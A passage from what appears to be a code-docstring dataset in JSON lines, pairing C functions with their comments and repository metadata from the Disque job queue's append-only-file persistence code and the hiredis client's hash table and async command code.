AOF_WAIT_REWRITE)\n        server.aof_rewrite_scheduled = 1;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* This is how rewriting of the append only file in background works:\n *\n * 1) The user calls BGREWRITEAOF\n * 2) Disque calls this function, that forks():\n *    2a) the child rewrite the append only file in a temp file.\n *    2b) the parent accumulates differences in server.aof_rewrite_buf.\n * 3) When the child finished '2a' exists.\n * 4) The parent will trap the exit code, if it's OK, will append the\n *    data accumulated into server.aof_rewrite_buf into the temp file, and\n *    finally will rename(2) the temp file in the actual file name.\n *    The the new file is reopened as the new append only file. Profit!\n */\n", "func_signal": "int rewriteAppendOnlyFileBackground(void)", "code": "{\n    pid_t childpid;\n    long long start;\n\n    if (server.aof_child_pid != -1) return C_ERR;\n    if (aofCreatePipes() != C_OK) return C_ERR;\n    start = ustime();\n    if ((childpid = fork()) == 0) {\n        char tmpfile[256];\n\n        /* Child */\n        closeListeningSockets(0);\n        serverSetProcTitle(\"disque-aof-rewrite\");\n        snprintf(tmpfile,256,\"temp-rewriteaof-bg-%d.aof\", (int) getpid());\n        if (rewriteAppendOnlyFile(tmpfile,1) == C_OK) {\n            size_t private_dirty = zmalloc_get_private_dirty();\n\n            if (private_dirty) {\n                serverLog(LL_NOTICE,\n                    \"AOF rewrite: %zu MB of memory used by copy-on-write\",\n                    private_dirty/(1024*1024));\n            }\n            exitFromChild(0);\n        } else {\n            exitFromChild(1);\n        }\n    } else {\n        /* Parent */\n        server.stat_fork_time = ustime()-start;\n        server.stat_fork_rate = (double) zmalloc_used_memory() * 1000000 / server.stat_fork_time / (1024*1024*1024); /* GB per second. */\n        latencyAddSampleIfNeeded(\"fork\",server.stat_fork_time/1000);\n        if (childpid == -1) {\n            serverLog(LL_WARNING,\n                \"Can't rewrite append only file in background: fork: %s\",\n                strerror(errno));\n            return C_ERR;\n        }\n        serverLog(LL_NOTICE,\n            \"Background append only file rewriting started by pid %d\",childpid);\n        server.aof_rewrite_scheduled = 0;\n        server.aof_rewrite_time_start = time(NULL);\n        server.aof_child_pid = childpid;\n        updateDictResizePolicy();\n        /* We set appendseldb to -1 in order to force the next call to the\n         * feedAppendOnlyFile() to issue a SELECT command, so the differences\n         * accumulated by the parent into server.aof_rewrite_buf will start\n         * with a SELECT statement and it will be safe to merge. */\n        server.aof_selected_db = -1;\n        return C_OK;\n    }\n    return C_OK; /* unreached */\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/*\n * Sleep for approximately ns nanoseconds.  No lower *nor* upper bound on sleep\n * time is guaranteed.\n */\n", "func_signal": "void\nmq_nanosleep(unsigned ns)", "code": "{\n\n\tassert(ns <= 1000*1000*1000);\n\n#ifdef _WIN32\n\tSleep(ns / 1000);\n#else\n\t{\n\t\tstruct timespec timeout;\n\n\t\tif (ns < 1000*1000*1000) {\n\t\t\ttimeout.tv_sec = 0;\n\t\t\ttimeout.tv_nsec = ns;\n\t\t} else {\n\t\t\ttimeout.tv_sec = 1;\n\t\t\ttimeout.tv_nsec = 0;\n\t\t}\n\t\tnanosleep(&timeout, NULL);\n\t}\n#endif\n}", "path": "disque/deps/jemalloc/test/src/mq.c", "commit_date": "2015-11-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Replay the append log file. On success C_OK is returned. On non fatal\n * error (the append only file is zero-length) C_ERR is returned. On\n * fatal error an error message is logged and the program exists. */\n", "func_signal": "int loadAppendOnlyFile(char *filename)", "code": "{\n    struct client *fakeClient;\n    FILE *fp = fopen(filename,\"r\");\n    struct disque_stat sb;\n    int old_aof_state = server.aof_state;\n    long loops = 0;\n    off_t valid_up_to = 0; /* Offset of the latest well-formed command loaded. */\n\n    if (fp && disque_fstat(fileno(fp),&sb) != -1 && sb.st_size == 0) {\n        server.aof_current_size = 0;\n        fclose(fp);\n        return C_ERR;\n    }\n\n    if (fp == NULL) {\n        serverLog(LL_WARNING,\"Fatal error: can't open the append log file for reading: %s\",strerror(errno));\n        exit(1);\n    }\n\n    /* Temporarily disable AOF, to prevent EXEC from feeding a MULTI\n     * to the same file we're about to read. */\n    server.aof_state = AOF_OFF;\n\n    fakeClient = createFakeClient();\n    startLoading(fp);\n\n    while(1) {\n        int argc, j;\n        unsigned long len;\n        robj **argv;\n        char buf[128];\n        sds argsds;\n        struct serverCommand *cmd;\n\n        /* Serve the clients from time to time */\n        if (!(loops++ % 1000)) {\n            loadingProgress(ftello(fp));\n            processEventsWhileBlocked();\n        }\n\n        if (fgets(buf,sizeof(buf),fp) == NULL) {\n            if (feof(fp))\n                break;\n            else\n                goto readerr;\n        }\n        if (buf[0] != '*') goto fmterr;\n        if (buf[1] == '\\0') goto readerr;\n        argc = atoi(buf+1);\n        if (argc < 1) goto fmterr;\n\n        argv = zmalloc(sizeof(robj*)*argc);\n        fakeClient->argc = argc;\n        fakeClient->argv = argv;\n\n        for (j = 0; j < argc; j++) {\n            if (fgets(buf,sizeof(buf),fp) == NULL) {\n                fakeClient->argc = j; /* Free up to j-1. */\n                freeFakeClientArgv(fakeClient);\n                goto readerr;\n            }\n            if (buf[0] != '$') goto fmterr;\n            len = strtol(buf+1,NULL,10);\n            argsds = sdsnewlen(NULL,len);\n            if (len && fread(argsds,len,1,fp) == 0) {\n                sdsfree(argsds);\n                fakeClient->argc = j; /* Free up to j-1. */\n                freeFakeClientArgv(fakeClient);\n                goto readerr;\n            }\n            argv[j] = createObject(OBJ_STRING,argsds);\n            if (fread(buf,2,1,fp) == 0) {\n                fakeClient->argc = j+1; /* Free up to j. */\n                freeFakeClientArgv(fakeClient);\n                goto readerr; /* discard CRLF */\n            }\n        }\n\n        /* Command lookup */\n        cmd = lookupCommand(argv[0]->ptr);\n        if (!cmd) {\n            serverLog(LL_WARNING,\"Unknown command '%s' reading the append only file\", (char*)argv[0]->ptr);\n            exit(1);\n        }\n\n        /* Run the command in the context of a fake client */\n        cmd->proc(fakeClient);\n\n        /* The fake client should not have a reply */\n        serverAssert(fakeClient->bufpos == 0 && listLength(fakeClient->reply) == 0);\n        /* The fake client should never get blocked */\n        serverAssert((fakeClient->flags & CLIENT_BLOCKED) == 0);\n\n        /* Clean up. Command code may have changed argv/argc so we use the\n         * argv/argc of the client instead of the local variables. */\n        freeFakeClientArgv(fakeClient);\n        if (server.aof_load_truncated) valid_up_to = ftello(fp);\n    }\n\nloaded_ok: /* DB loaded, cleanup and return C_OK to the caller. */\n    fclose(fp);\n    freeFakeClient(fakeClient);\n    server.aof_state = old_aof_state;\n    stopLoading();\n    aofUpdateCurrentSize();\n    server.aof_rewrite_base_size = server.aof_current_size;\n    return C_OK;\n\nreaderr: /* Read error. If feof(fp) is true, fall through to unexpected EOF. */\n    if (!feof(fp)) {\n        serverLog(LL_WARNING,\"Unrecoverable error reading the append only file: %s\", strerror(errno));\n        exit(1);\n    }\n\n    /* Unexpected AOF end of file. */\n    if (server.aof_load_truncated) {\n        serverLog(LL_WARNING,\"!!! Warning: short read while loading the AOF file !!!\");\n        serverLog(LL_WARNING,\"!!! Truncating the AOF at offset %llu !!!\",\n            (unsigned long long) valid_up_to);\n        if (valid_up_to == -1 || truncate(filename,valid_up_to) == -1) {\n            if (valid_up_to == -1) {\n                serverLog(LL_WARNING,\"Last valid command offset is invalid\");\n            } else {\n                serverLog(LL_WARNING,\"Error truncating the AOF file: %s\",\n                    strerror(errno));\n            }\n        } else {\n            /* Make sure the AOF file descriptor points to the end of the\n             * file after the truncate call. */\n            if (server.aof_fd != -1 && lseek(server.aof_fd,0,SEEK_END) == -1) {\n                serverLog(LL_WARNING,\"Can't seek the end of the AOF file: %s\",\n                    strerror(errno));\n            } else {\n                serverLog(LL_WARNING,\n                    \"AOF loaded anyway because aof-load-truncated is enabled\");\n                goto loaded_ok;\n            }\n        }\n    }\n    serverLog(LL_WARNING,\"Unexpected end of file reading the append only file. You can: 1) Make a backup of your AOF file, then use ./disque-check-aof --fix <filename>. 2) Alternatively you can set the 'aof-load-truncated' configuration option to yes and restart the server.\");\n    exit(1);\n\nfmterr: /* Format error. */\n    serverLog(LL_WARNING,\"Bad file format reading the append only file: make a backup of your AOF file, then use ./disque-check-aof --fix <filename>\");\n    exit(1);\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Called when the user switches from \"appendonly no\" to \"appendonly yes\"\n * at runtime using the CONFIG command. */\n", "func_signal": "int startAppendOnly(void)", "code": "{\n    server.aof_last_fsync = server.unixtime;\n    server.aof_fd = open(server.aof_filename,O_WRONLY|O_APPEND|O_CREAT,0644);\n    serverAssert(server.aof_state == AOF_OFF);\n    if (server.aof_fd == -1) {\n        serverLog(LL_WARNING,\"Disque needs to enable the AOF but can't open the append only file: %s\",strerror(errno));\n        return C_ERR;\n    }\n    if (rewriteAppendOnlyFileBackground() == C_ERR) {\n        close(server.aof_fd);\n        serverLog(LL_WARNING,\"Disque needs to enable the AOF but can't trigger a background AOF rewrite operation. Check the above logs for more info about the error.\");\n        return C_ERR;\n    }\n    /* We correctly switched on AOF, now wait for the rewrite to be complete\n     * in order to append data on disk. */\n    server.aof_state = AOF_WAIT_REWRITE;\n    return C_OK;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* This event handler is called when the AOF rewriting child sends us a\n * single '!' char to signal we should stop sending buffer diffs. The\n * parent sends a '!' as well to acknowledge. */\n", "func_signal": "void aofChildPipeReadable(aeEventLoop *el, int fd, void *privdata, int mask)", "code": "{\n    char byte;\n    UNUSED(el);\n    UNUSED(privdata);\n    UNUSED(mask);\n\n    if (read(fd,&byte,1) == 1 && byte == '!') {\n        serverLog(LL_NOTICE,\"AOF rewrite child asks to stop sending diffs.\");\n        server.aof_stop_sending_diff = 1;\n        if (write(server.aof_pipe_write_ack_to_child,\"!\",1) != 1) {\n            /* If we can't send the ack, inform the user, but don't try again\n             * since in the other side the children will use a timeout if the\n             * kernel can't buffer our write, or, the children was\n             * terminated. */\n            serverLog(LL_WARNING,\"Can't send ACK to AOF child: %s\",\n                strerror(errno));\n        }\n    }\n    /* Remove the handler since this can be called only one time during a\n     * rewrite. */\n    aeDeleteFileEvent(server.el,server.aof_pipe_read_ack_from_child,AE_READABLE);\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Return the current size of the AOF rewrite buffer. */\n", "func_signal": "unsigned long aofRewriteBufferSize(void)", "code": "{\n    listNode *ln;\n    listIter li;\n    unsigned long size = 0;\n\n    listRewind(server.aof_rewrite_buf_blocks,&li);\n    while((ln = listNext(&li))) {\n        aofrwblock *block = listNodeValue(ln);\n        size += block->used;\n    }\n    return size;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Append data to the AOF rewrite buffer, allocating new blocks if needed. */\n", "func_signal": "void aofRewriteBufferAppend(unsigned char *s, unsigned long len)", "code": "{\n    listNode *ln = listLast(server.aof_rewrite_buf_blocks);\n    aofrwblock *block = ln ? ln->value : NULL;\n\n    while(len) {\n        /* If we already got at least an allocated block, try appending\n         * at least some piece into it. */\n        if (block) {\n            unsigned long thislen = (block->free < len) ? block->free : len;\n            if (thislen) {  /* The current block is not already full. */\n                memcpy(block->buf+block->used, s, thislen);\n                block->used += thislen;\n                block->free -= thislen;\n                s += thislen;\n                len -= thislen;\n            }\n        }\n\n        if (len) { /* First block to allocate, or need another block. */\n            int numblocks;\n\n            block = zmalloc(sizeof(*block));\n            block->free = AOF_RW_BUF_BLOCK_SIZE;\n            block->used = 0;\n            listAddNodeTail(server.aof_rewrite_buf_blocks,block);\n\n            /* Log every time we cross more 10 or 100 blocks, respectively\n             * as a notice or warning. */\n            numblocks = listLength(server.aof_rewrite_buf_blocks);\n            if (((numblocks+1) % 10) == 0) {\n                int level = ((numblocks+1) % 100) == 0 ? LL_WARNING :\n                                                         LL_NOTICE;\n                serverLog(level,\"Background AOF buffer size: %lu MB\",\n                    aofRewriteBufferSize()/(1024*1024));\n            }\n        }\n    }\n\n    /* Install a file event to send data to the rewrite child if there is\n     * not one already. */\n    if (aeGetFileEvents(server.el,server.aof_pipe_write_data_to_child) == 0) {\n        aeCreateFileEvent(server.el, server.aof_pipe_write_data_to_child,\n            AE_WRITABLE, aofChildWriteDiffData, NULL);\n    }\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Refresh the loading progress info */\n", "func_signal": "void loadingProgress(off_t pos)", "code": "{\n    server.loading_loaded_bytes = pos;\n    if (server.stat_peak_memory < zmalloc_used_memory())\n        server.stat_peak_memory = zmalloc_used_memory();\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Update the server.aof_current_size field explicitly using stat(2)\n * to check the size of the file. This is useful after a rewrite or after\n * a restart, normally the size is updated just adding the write length\n * to the current length, that is much faster. */\n", "func_signal": "void aofUpdateCurrentSize(void)", "code": "{\n    struct disque_stat sb;\n    mstime_t latency;\n\n    latencyStartMonitor(latency);\n    if (disque_fstat(server.aof_fd,&sb) == -1) {\n        serverLog(LL_WARNING,\"Unable to obtain the AOF file length. stat: %s\",\n            strerror(errno));\n    } else {\n        server.aof_current_size = sb.st_size;\n    }\n    latencyEndMonitor(latency);\n    latencyAddSampleIfNeeded(\"aof-fstat\",latency);\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Write the buffer (possibly composed of multiple blocks) into the specified\n * fd. If a short write or any other error happens -1 is returned,\n * otherwise the number of bytes written is returned. */\n", "func_signal": "ssize_t aofRewriteBufferWrite(int fd)", "code": "{\n    listNode *ln;\n    listIter li;\n    ssize_t count = 0;\n\n    listRewind(server.aof_rewrite_buf_blocks,&li);\n    while((ln = listNext(&li))) {\n        aofrwblock *block = listNodeValue(ln);\n        ssize_t nwritten;\n\n        if (block->used) {\n            nwritten = write(fd,block->buf,block->used);\n            if (nwritten != (ssize_t)block->used) {\n                if (nwritten == 0) errno = EIO;\n                return -1;\n            }\n            count += nwritten;\n        }\n    }\n    return count;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* In Disque commands are always executed in the context of a client, so in\n * order to load the append only file we need to create a fake client. */\n", "func_signal": "struct client *createFakeClient(void)", "code": "{\n    struct client *c = zmalloc(sizeof(*c));\n\n    c->fd = -1;\n    c->name = NULL;\n    c->querybuf = sdsempty();\n    c->querybuf_peak = 0;\n    c->argc = 0;\n    c->argv = NULL;\n    c->bufpos = 0;\n    c->flags = CLIENT_AOF_CLIENT;\n    c->btype = BLOCKED_NONE;\n    c->reply = listCreate();\n    c->reply_bytes = 0;\n    c->obuf_soft_limit_reached_time = 0;\n    c->peerid = NULL;\n    listSetFreeMethod(c->reply,decrRefCountVoid);\n    listSetDupMethod(c->reply,dupClientReplyValue);\n    return c;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Called when the user switches from \"appendonly yes\" to \"appendonly no\"\n * at runtime using the CONFIG command. */\n", "func_signal": "void stopAppendOnly(void)", "code": "{\n    serverAssert(server.aof_state != AOF_OFF);\n    flushAppendOnlyFile(1);\n    aof_fsync(server.aof_fd);\n    close(server.aof_fd);\n\n    server.aof_fd = -1;\n    server.aof_selected_db = -1;\n    server.aof_state = AOF_OFF;\n    /* rewrite operation in progress? kill it, wait child exit */\n    if (server.aof_child_pid != -1) {\n        int statloc;\n\n        serverLog(LL_NOTICE,\"Killing running AOF rewrite child: %ld\",\n            (long) server.aof_child_pid);\n        if (kill(server.aof_child_pid,SIGUSR1) != -1)\n            wait3(&statloc,0,NULL);\n        /* reset the buffer accumulating changes while the child saves */\n        aofRewriteBufferReset();\n        aofRemoveTempFile(server.aof_child_pid);\n        server.aof_child_pid = -1;\n        server.aof_rewrite_time_start = -1;\n        /* close pipes used for IPC between the two processes. */\n        aofClosePipes();\n    }\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Write a sequence of commands able to fully rebuild the dataset into\n * \"filename\". Used both by BGREWRITEAOF and SHUTDOWN REWRITE.\n *\n * If 'background' is non-zero, the function assumes to be running in the\n * context of a child process, so it will attempt to read the accumulated\n * difference buffer from the parent process (all the writes happening in the\n * parent side while we rewrite the AOF). Otherwise if 'background' is zero\n * the function assumes we are just doing a foreground rewrite, for example\n * via the SHUTDOWN REWRITE command, and no parent diff is read.\n *\n * Return value: on success C_OK, on error C_ERR. */\n", "func_signal": "int rewriteAppendOnlyFile(char *filename, int background)", "code": "{\n    dictIterator *di = NULL;\n    rio aof;\n    FILE *fp;\n    char tmpfile[256];\n    char byte;\n\n    /* Note that we have to use a different temp name here compared to the\n     * one used by rewriteAppendOnlyFileBackground() function. */\n    snprintf(tmpfile,256,\"temp-rewriteaof-%d.aof\", (int) getpid());\n    fp = fopen(tmpfile,\"w\");\n    if (!fp) {\n        serverLog(LL_WARNING, \"Opening the temp file for AOF rewrite in rewriteAppendOnlyFile(): %s\", strerror(errno));\n        return C_ERR;\n    }\n\n    if (background) server.aof_child_diff = sdsempty();\n    rioInitWithFile(&aof,fp);\n    if (server.aof_rewrite_incremental_fsync)\n        rioSetAutoSync(&aof,AOF_AUTOSYNC_BYTES);\n\n    /* Rerwite jobs that are in interesting states: active or queued.\n     * ad LOADJOB commands. */\n    di = dictGetIterator(server.jobs);\n    struct dictEntry *de;\n    while((de = dictNext(di)) != NULL) {\n        job *job = dictGetKey(de);\n        if (job->state != JOB_STATE_ACTIVE &&\n            job->state != JOB_STATE_QUEUED) continue;\n\n        char cmd[] = \"*2\\r\\n$7\\r\\nLOADJOB\\r\\n\";\n        sds serialized = serializeJob(sdsempty(),job,SER_STORAGE);\n        if (rioWrite(&aof,cmd,sizeof(cmd)-1) == 0) goto werr;\n        if (rioWriteBulkString(&aof,serialized,sdslen(serialized)) == 0)\n            goto werr;\n        sdsfree(serialized);\n    }\n    dictReleaseIterator(di);\n    di = NULL; /* Don't free it at end. */\n\n    /* If this is a synchronous rewrite, skip all the child-parent\n     * handshake about the difference buffer. */\n    if (!background) goto flush_and_rename;\n\n    /* Do an initial slow fsync here while the parent is still sending\n     * data, in order to make the next final fsync faster. */\n    if (fflush(fp) == EOF) goto werr;\n    if (fsync(fileno(fp)) == -1) goto werr;\n\n    /* Read again a few times to get more data from the parent.\n     * We can't read forever (the server may receive data from clients\n     * faster than it is able to send data to the child), so we try to read\n     * some more data in a loop as soon as there is a good chance more data\n     * will come. If it looks like we are wasting time, we abort (this\n     * happens after 20 ms without new data). */\n    int nodata = 0;\n    mstime_t start = mstime();\n    while(mstime()-start < 1000 && nodata < 20) {\n        if (aeWait(server.aof_pipe_read_data_from_parent, AE_READABLE, 1) <= 0)\n        {\n            nodata++;\n            continue;\n        }\n        nodata = 0; /* Start counting from zero, we stop on N *contiguous*\n                       timeouts. */\n        aofReadDiffFromParent();\n    }\n\n    /* Ask the master to stop sending diffs. */\n    if (write(server.aof_pipe_write_ack_to_parent,\"!\",1) != 1) goto werr;\n    if (anetNonBlock(NULL,server.aof_pipe_read_ack_from_parent) != ANET_OK)\n        goto werr;\n    /* We read the ACK from the server using a 10 seconds timeout. Normally\n     * it should reply ASAP, but just in case we lose its reply, we are sure\n     * the child will eventually get terminated. */\n    if (syncRead(server.aof_pipe_read_ack_from_parent,&byte,1,5000) != 1 ||\n        byte != '!') goto werr;\n    serverLog(LL_NOTICE,\"Parent agreed to stop sending diffs. Finalizing AOF...\");\n\n    /* Read the final diff if any. */\n    aofReadDiffFromParent();\n\n    /* Write the received diff to the file. */\n    serverLog(LL_NOTICE,\n        \"Concatenating %.2f MB of AOF diff received from parent.\",\n        (double) sdslen(server.aof_child_diff) / (1024*1024));\n    if (rioWrite(&aof,server.aof_child_diff,sdslen(server.aof_child_diff)) == 0)\n        goto werr;\n\nflush_and_rename:\n    /* Make sure data will not remain on the OS's output buffers */\n    if (fflush(fp) == EOF) goto werr;\n    if (fsync(fileno(fp)) == -1) goto werr;\n    if (fclose(fp) == EOF) goto werr;\n\n    /* Use RENAME to make sure the AOF file is changed atomically only\n     * if the generate AOF file is ok. */\n    if (rename(tmpfile,filename) == -1) {\n        serverLog(LL_WARNING,\"Error moving temp append only file on the final destination: %s\", strerror(errno));\n        unlink(tmpfile);\n        return C_ERR;\n    }\n    serverLog(LL_NOTICE,\"SYNC append only file rewrite performed\");\n    return C_OK;\n\nwerr:\n    serverLog(LL_WARNING,\"Write error writing append only file on disk: %s\", strerror(errno));\n    fclose(fp);\n    unlink(tmpfile);\n    if (di) dictReleaseIterator(di);\n    return C_ERR;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Event handler used to send data to the child process doing the AOF\n * rewrite. We send pieces of our AOF differences buffer so that the final\n * write when the child finishes the rewrite will be small. */\n", "func_signal": "void aofChildWriteDiffData(aeEventLoop *el, int fd, void *privdata, int mask)", "code": "{\n    listNode *ln;\n    aofrwblock *block;\n    ssize_t nwritten;\n    UNUSED(el);\n    UNUSED(fd);\n    UNUSED(privdata);\n    UNUSED(mask);\n\n    while(1) {\n        ln = listFirst(server.aof_rewrite_buf_blocks);\n        block = ln ? ln->value : NULL;\n        if (server.aof_stop_sending_diff || !block) {\n            aeDeleteFileEvent(server.el,server.aof_pipe_write_data_to_child,\n                              AE_WRITABLE);\n            return;\n        }\n        if (block->used > 0) {\n            nwritten = write(server.aof_pipe_write_data_to_child,\n                             block->buf,block->used);\n            if (nwritten <= 0) return;\n            memmove(block->buf,block->buf+nwritten,block->used-nwritten);\n            block->used -= nwritten;\n        }\n        if (block->used == 0) listDelNode(server.aof_rewrite_buf_blocks,ln);\n    }\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Delegate writing an object to writing a bulk string or bulk long long.\n * This is not placed in rio.c since that adds the disque.h dependency. */\n", "func_signal": "int rioWriteBulkObject(rio *r, robj *obj)", "code": "{\n    /* Avoid using getDecodedObject to help copy-on-write (we are often\n     * in a child process when this function is called). */\n    if (obj->encoding == OBJ_ENCODING_INT) {\n        return rioWriteBulkLongLong(r,(long)obj->ptr);\n    } else if (sdsEncodedObject(obj)) {\n        return rioWriteBulkString(r,obj->ptr,sdslen(obj->ptr));\n    } else {\n        serverPanic(\"Unknown string encoding\");\n    }\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Add an element to the target hash table */\n", "func_signal": "static int dictAdd(dict *ht, void *key, void *val)", "code": "{\n    int index;\n    dictEntry *entry;\n\n    /* Get the index of the new element, or -1 if\n     * the element already exists. */\n    if ((index = _dictKeyIndex(ht, key)) == -1)\n        return DICT_ERR;\n\n    /* Allocates the memory and stores key */\n    entry = hi_malloc(sizeof(*entry));\n    if (entry == NULL)\n        return DICT_ERR;\n\n    entry->next = ht->table[index];\n    ht->table[index] = entry;\n\n    /* Set the hash entry fields. */\n    dictSetHashKey(ht, entry, key);\n    dictSetHashVal(ht, entry, val);\n    ht->used++;\n    return DICT_OK;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Expand or create the hashtable */\n", "func_signal": "static int dictExpand(dict *ht, unsigned long size)", "code": "{\n    dict n; /* the new hashtable */\n    unsigned long realsize = _dictNextPower(size), i;\n\n    /* the size is invalid if it is smaller than the number of\n     * elements already inside the hashtable */\n    if (ht->used > size)\n        return DICT_ERR;\n\n    _dictInit(&n, ht->type, ht->privdata);\n    n.size = realsize;\n    n.sizemask = realsize-1;\n    n.table = hi_calloc(realsize,sizeof(dictEntry*));\n    if (n.table == NULL)\n        return DICT_ERR;\n\n    /* Copy all the elements from the old to the new table:\n     * note that if the old hash table is empty ht->size is zero,\n     * so dictExpand just creates an hash table. */\n    n.used = ht->used;\n    for (i = 0; i < ht->size && ht->used > 0; i++) {\n        dictEntry *he, *nextHe;\n\n        if (ht->table[i] == NULL) continue;\n\n        /* For each hash entry on this slot... */\n        he = ht->table[i];\n        while(he) {\n            unsigned int h;\n\n            nextHe = he->next;\n            /* Get the new element index */\n            h = dictHashKey(ht, he->key) & n.sizemask;\n            he->next = n.table[h];\n            n.table[h] = he;\n            ht->used--;\n            /* Pass to the next element */\n            he = nextHe;\n        }\n    }\n    assert(ht->used == 0);\n    hi_free(ht->table);\n\n    /* Remap the new hashtable in the old */\n    *ht = n;\n    return DICT_OK;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Tries to do a clean disconnect from Redis, meaning it stops new commands\n * from being issued, but tries to flush the output buffer and execute\n * callbacks for all remaining replies. When this function is called from a\n * callback, there might be more replies and we can safely defer disconnecting\n * to redisProcessCallbacks(). Otherwise, we can only disconnect immediately\n * when there are no pending callbacks. */\n", "func_signal": "void redisAsyncDisconnect(redisAsyncContext *ac)", "code": "{\n    redisContext *c = &(ac->c);\n    c->flags |= REDIS_DISCONNECTING;\n\n    /** unset the auto-free flag here, because disconnect undoes this */\n    c->flags &= ~REDIS_NO_AUTO_FREE;\n    if (!(c->flags & REDIS_IN_CALLBACK) && ac->replies.head == NULL)\n        __redisAsyncDisconnect(ac);\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Functions managing dictionary of callbacks for pub/sub. */\n", "func_signal": "static unsigned int callbackHash(const void *key)", "code": "{\n    return dictGenHashFunction((const unsigned char *)key,\n                               sdslen((const sds)key));\n}", "path": "hiredis/async.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Add an element, discarding the old if the key already exists.\n * Return 1 if the key was added from scratch, 0 if there was already an\n * element with such key and dictReplace() just performed a value update\n * operation. */\n", "func_signal": "static int dictReplace(dict *ht, void *key, void *val)", "code": "{\n    dictEntry *entry, auxentry;\n\n    /* Try to add the element. If the key\n     * does not exists dictAdd will succeed. */\n    if (dictAdd(ht, key, val) == DICT_OK)\n        return 1;\n    /* It already exists, get the entry */\n    entry = dictFind(ht, key);\n    if (entry == NULL)\n        return 0;\n\n    /* Free the old value and set the new one */\n    /* Set the new value and free the old one. Note that it is important\n     * to do that in this order, as the value may just be exactly the same\n     * as the previous one. In this context, think to reference counting,\n     * you want to increment (set), and then decrement (free), and not the\n     * reverse. */\n    auxentry = *entry;\n    dictSetHashVal(ht, entry, val);\n    dictFreeEntryVal(ht, &auxentry);\n    return 0;\n}", "path": "hiredis/dict.c", "commit_date": "2020-05-22 00:00:00", "repo_name": "redis/hiredis", "stars": 6036, "license": "bsd-3-clause", "language": "c", "size": 1691}
{"docstring": "/* Helper function for the redisAsyncCommand* family of functions. Writes a\n * formatted command to the output buffer and registers the provided callback\n * function with the context. */\n", "func_signal": "static int __redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn *fn, void *privdata, const char *cmd, size_t len)", "code": "{\n    redisContext *c = &(ac->c);\n    redisCallback cb;\n    struct dict *cbdict;\n    dictEntry *de;\n    redisCallback *existcb;\n    int pvariant, hasnext;\n    const char *cstr, *astr;\n    size_t clen, alen;\n    const char *p;\n    sds sname;\n    int ret;\n\n    /* Don't accept new commands when the connection is about to be closed. */\n    if (c->flags & (REDIS_DISCONNECTING | REDIS_FREEING)) return REDIS_ERR;\n\n    /* Setup callback */\n    cb.fn = fn;\n    cb.privdata = privdata;\n    cb.pending_subs = 1;\n\n    /* Find out which command will be appended. */\n    p = nextArgument(cmd,&cstr,&clen);\n    assert(p != NULL);\n    hasnext = (p[0] == '$');\n    pvariant = (tolower(cstr[0]) == 'p') ? 1 : 0;\n    cstr += pvariant;\n    clen -= pvariant;\n\n    if (hasnext && strncasecmp(cstr,\"subscribe\\r\\n\",11) == 0) {\n        c->flags |= REDIS_SUBSCRIBED;\n\n        /* Add every channel/pattern to the list of subscription callbacks. */\n        while ((p = nextArgument(p,&astr,&alen)) 